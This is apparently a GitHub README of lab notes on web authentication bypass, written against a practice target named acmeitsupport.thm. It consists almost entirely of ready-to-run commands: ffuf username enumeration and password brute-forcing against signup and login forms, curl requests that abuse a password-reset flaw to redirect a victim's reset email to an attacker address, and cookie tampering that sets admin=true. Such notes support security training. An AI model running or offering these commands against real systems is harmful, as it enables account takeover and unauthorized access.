# Authentication-Bypass 
  ![loginReq](https://user-images.githubusercontent.com/94301241/175791940-dea54eb2-cfb2-4cd5-885d-6ac5f2dc6190.png)

# 🤢Username Enumeration
    ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type:       application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
  
# ▶️ Brute Force
      Example1: ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2       -X     POST -d       "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc        200
      Example2: ffuf -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -X POST -d                      "username=steve&     password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.170.164/customers/login -fc 200

# ▶️Logic Flaw 
    i. curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d                 'username=robert'
    ii. curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d                 'username=robert&email=attacker@hacker.com'
    iii. curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
  
 # 🍪Cookie Tampering 
    i.  curl http://MACHINE_IP/cookie-test
    ii. curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
    iii. curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
    Online-Tools: https://crackstation.net/
